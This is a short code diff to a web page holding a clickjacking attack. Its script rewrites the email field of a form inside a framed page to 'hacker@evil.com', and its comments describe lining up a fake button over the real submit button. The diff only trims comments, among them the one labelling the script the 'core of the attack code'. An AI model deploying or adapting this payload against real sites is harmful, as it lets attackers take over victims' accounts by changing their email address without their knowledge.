@@ -72,17 +72,16 @@
       scrolling="no">
     </iframe>
     <script>
-      // Logic added to automatically rewrite the form values after the iframe loads,
+      // Automatically rewrite the form values after the iframe loads,
       // and precisely align the iframe's button over the submit button
       document.getElementById('hijacked_frame').onload = function() {
           var iframeDoc = document.getElementById('hijacked_frame').contentWindow.document;
 
-          // Core of the attack code: Forcefully rewrite the email address input field in the form
+          // Forcefully rewrite the email address input field in the form
           var mailInput = iframeDoc.querySelector('input[name="mail"]');
           if (mailInput) {
               mailInput.value = "hacker@evil.com";
           }
-
           // When the user clicks the fake button, the submit button of this transparent form is clicked
           // The attacker adjusts the top/left of #fake_button to align with the Submit button using CSS
       };
